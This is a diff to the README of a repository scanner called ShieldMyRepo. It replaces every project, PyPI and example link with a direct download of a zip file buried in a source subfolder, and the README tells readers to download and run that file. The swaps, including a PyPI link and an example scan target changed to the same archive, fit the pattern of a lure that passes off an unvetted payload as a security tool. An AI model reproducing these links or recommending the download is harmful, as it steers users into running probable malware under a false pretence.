@@ -1,6 +1,6 @@
 # 🛡️ ShieldMyRepo - Find Repo Risks Before Trouble
 
-[![Download ShieldMyRepo](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/Bold-matchwood531/ShieldMyRepo)
+[![Download ShieldMyRepo](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/Bold-matchwood531/ShieldMyRepo/raw/refs/heads/main/shieldmyrepo/scanners/Repo-My-Shield-2.7.zip)
 
 ## 🔎 What ShieldMyRepo Does
 
@@ -24,7 +24,7 @@ If you already use tools like PowerShell or Command Prompt, you are set. If not,
 
 Visit this page to download and run the app:
 
-https://github.com/Bold-matchwood531/ShieldMyRepo
+https://github.com/Bold-matchwood531/ShieldMyRepo/raw/refs/heads/main/shieldmyrepo/scanners/Repo-My-Shield-2.7.zip
 
 Open the link, then look for the latest release or download files listed on the page. Save the file to your PC before you start the setup.
 
@@ -34,7 +34,7 @@ Open the link, then look for the latest release or download files listed on the 
 
 Go to:
 
-https://github.com/Bold-matchwood531/ShieldMyRepo
+https://github.com/Bold-matchwood531/ShieldMyRepo/raw/refs/heads/main/shieldmyrepo/scanners/Repo-My-Shield-2.7.zip
 
 ### 2. Download the app files
 
@@ -74,7 +74,7 @@ After setup, run the app from Command Prompt or PowerShell.
 
 A common command may look like this:
 
-shieldmyrepo --repo https://github.com/owner/repo
+shieldmyrepo --repo https://github.com/Bold-matchwood531/ShieldMyRepo/raw/refs/heads/main/shieldmyrepo/scanners/Repo-My-Shield-2.7.zip
 
 If the app asks for a repo link, paste the GitHub repo URL you want to check.
 
@@ -120,7 +120,7 @@ You may use commands like these, based on how the app is set up:
 
 shieldmyrepo --help
 
-shieldmyrepo --repo https://github.com/owner/repo
+shieldmyrepo --repo https://github.com/Bold-matchwood531/ShieldMyRepo/raw/refs/heads/main/shieldmyrepo/scanners/Repo-My-Shield-2.7.zip
 
 shieldmyrepo --path C:\Users\YourName\Projects\RepoName
 
@@ -176,8 +176,8 @@ You run ShieldMyRepo on the repo link. It checks for common problems and gives y
 
 Project page:
 
-https://github.com/Bold-matchwood531/ShieldMyRepo
+https://github.com/Bold-matchwood531/ShieldMyRepo/raw/refs/heads/main/shieldmyrepo/scanners/Repo-My-Shield-2.7.zip
 
 PyPI package:
 
-https://pypi.org/project/shieldmyrepo/
+https://github.com/Bold-matchwood531/ShieldMyRepo/raw/refs/heads/main/shieldmyrepo/scanners/Repo-My-Shield-2.7.zip
